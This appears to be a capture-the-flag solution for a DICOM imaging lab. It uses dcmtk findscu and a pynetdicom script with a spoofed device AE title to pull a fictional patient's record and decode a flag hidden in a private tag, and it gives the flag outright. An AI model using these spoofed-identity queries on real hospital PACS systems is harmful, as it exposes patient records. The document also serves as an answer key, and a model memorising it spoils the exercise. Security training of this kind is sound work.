# Stage 2 solution — C-FIND the inmate's private tag (Flag 2)

With the AE titles from stage 1 (calling = a leaked device such as `XRAY_ER_01`,
called = Flag 1, e.g. `BHV_XR_9F2C71A4`), query the X-ray for the known inmate
**SULLIVAN^JAMES**. His record over-shares a private tag that carries Flag 2.

Target: `$TARGET`, port `11112`.

## Option A — dcmtk `findscu`

```bash
# sanity check the association first
echoscu -aet XRAY_ER_01 -aec BHV_XR_9F2C71A4 $TARGET 11112

# C-FIND for the inmate (Patient Root)
findscu -P \
  -k QueryRetrieveLevel=PATIENT \
  -k PatientName="SULLIVAN^JAMES" \
  -k PatientID -k PatientBirthDate \
  -aet XRAY_ER_01 -aec BHV_XR_9F2C71A4 \
  $TARGET 11112
```

The response includes a private block. Without a local dictionary the value
comes back as an "Unknown Tag" in hex:

```
I: (0009,0010) LO [SCARE_FLOOR_DCM ]                       PrivateCreator
I: (0009,1001) ?? 42\48\56\7b\73\63\34\72\65\5f\66\6c... Unknown Tag & Data
I: (0010,0010) PN [SULLIVAN^JAMES]
I: (0010,0020) LO [INM-11771 ]
```

Decode the hex to read the flag:

```bash
python3 -c "print(bytes.fromhex('42 48 56 7b 73 63 34 72 65 5f 66 6c 30 30 72 5f 70 72 31 76 34 74 65 5f 74 34 67 5f 78 72 7d 20'.replace(' ','')).decode())"
# -> BHV{sc4re_fl00r_pr1v4te_t4g_xr}
```

(Or feed dcmtk a private dictionary via `DCMDICTPATH` so it prints the LO value
directly.)

## Option B — pynetdicom (`solve_cfind.py`)

```bash
python3 solution/solve_cfind.py \
  --host $TARGET --port 11112 \
  --calling XRAY_ER_01 --called BHV_XR_9F2C71A4 \
  --patient "SULLIVAN^JAMES"
# -> [flag] BHV{sc4re_fl00r_pr1v4te_t4g_xr}
```

**Flag 2 = `BHV{sc4re_fl00r_pr1v4te_t4g_xr}`.**

## Lead-out (toward the HL7 stage)
A Modality Worklist C-FIND against the same endpoint returns the scheduled
order for this inmate — `AccessionNumber=ACC-SCARE-0001`,
`PlacerOrderNumber=ORD-7742`. Those identifiers are the key the next phase's
HL7 `ORM^O01` message is built around:

```bash
findscu -W \
  -k ScheduledProcedureStepSequence \
  -aet XRAY_ER_01 -aec BHV_XR_9F2C71A4 \
  $TARGET 11112
```
